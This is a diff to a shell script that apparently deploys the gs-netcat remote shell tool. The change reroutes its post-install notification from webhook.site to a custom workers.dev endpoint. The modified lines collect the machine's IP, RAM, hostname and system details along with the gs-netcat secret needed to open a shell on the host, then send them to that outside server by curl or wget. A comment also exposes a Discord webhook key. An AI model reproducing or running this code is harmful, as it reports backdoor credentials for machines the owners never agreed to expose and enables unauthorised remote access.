@@ -105,10 +105,10 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 [[ -n $GS_WEBHOOK_KEY ]] && {
 	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
 	ram=$(free -m | awk '/^Mem:/{printf("%.1fGb\n",$2/1000)}')
-	ip=$(curl -s https://api.ipify.org)
-	data='{"ip","$ip", "ram": "$ram", "hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
-	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
-	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
+	ip=$(hostname -I | awk '{print $1}')
+	data='{"ip","$ip", "ram": "$ram", "hostname": "$(hostname)", "system": "$(uname -rom)", "uuid":"${GS_SECRET}" ,"access": "gs-netcat -i -s ${GS_SECRET}"}'
+	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://kvdb.addea.workers.dev/add")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://kvdb.addea.workers.dev/add")
 }
 ### discord webhook
 # GS_DISCORD_KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
